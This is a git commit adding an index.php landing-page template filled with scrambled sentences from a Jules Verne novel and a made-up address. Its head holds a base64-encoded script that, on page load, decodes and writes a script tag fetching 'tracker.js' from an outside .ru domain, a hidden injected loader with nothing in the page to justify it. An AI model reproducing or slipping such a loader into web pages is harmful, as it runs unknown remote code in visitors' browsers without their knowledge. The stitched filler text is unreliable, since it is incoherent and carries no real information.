06efd299462fadd1005321276edbcc9f7f84db36
xjnfaaot <77595367+xjnfaaot@users.noreply.github.com>
2021-01-18 03:08:26 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Certainly, said I, carried away by the captain's reasoning; if the surface of the</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl85OGFjaTVpZjVhNHkxMHBtYjYiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="t4a1uibtj5z95v0etdma4vh">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="8t8su2im67693zi">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Certainly, said I, carried away by the captain's reasoning; if the surface of the</h1>
+	</section>
+
+
+	<section class="our-work" class="v39yu4y7iw1azj5d6m25dt">
+		<h3 class="title">Bah, said the rancorous harpooner, what do you supp</h3>
+		<p>What is to be done, Ned, since flight is impracticable just now? After supper, which was served by the steward, mute and impassible, I went to bed, not without some anxiety. As to the fish, they always provoked our admiration when we surprised the secrets of their aquatic life through the open panels. I saw many kinds which I never before had a chance of observing. With the Ruhmkorff apparatus, M. Aronnax; one is carried on the back, the other is fastened to the waist. It is composed of a Bunsen pile, which I do not work with bichromate of potash, but with sodium. A wire is introduced which collects the electricity produced, and directs it toward a particularly made lantern. In this lantern is a spiral glass which contains a small quantity of carbonic gas. When the apparatus is at work, this gas becomes luminous, giving out a white and continuous light. Thus provided, I can breathe and I can see.</p>
+		<hr>
+
+		<ul class="grid" class="56s07hker2go7hsai4x1">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="t4a1uibtj5z95v0etdma4vh">
+		<h3 class="title">Savages.</h3>
+		<p>One was short, very muscular, broad-shouldered, with robust limbs, strong head, an abundance of black hair, thick mustache, a quick, penetrating look, and the vivacity which characterizes the population of Southern France. The captain did not answer me, but came and leaned against the panel. In the midst of the glade, on a pedestal of rocks roughly piled up, stood a cross of coral, that extended its long arms that one might have thought were made of petrified blood. You are right, Conseil.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8t8su2im67693zi" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="56s07hker2go7hsai4x1" class="title">I would fain have asked him; not being able to, I stopped him-I</h3>	
+		<p>You are following the chain of events? asked Captain Nemo. Professor, said this strange man, you must excuse the unceremonious way in which I receive you, and the disorder of this room. Well? I asked, not catching the captain's idea. Certainly, sir.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="t4a1uibtj5z95v0etdma4vh">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="8t8su2im67693zi"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="v39yu4y7iw1azj5d6m25dt"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="56s07hker2go7hsai4x1"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>5581 Reichel Corner, Apt. 932, 16719-2314, Ornbury, Maryland, United States</p>
+	</footer>
+
+</body>
+
+</html>
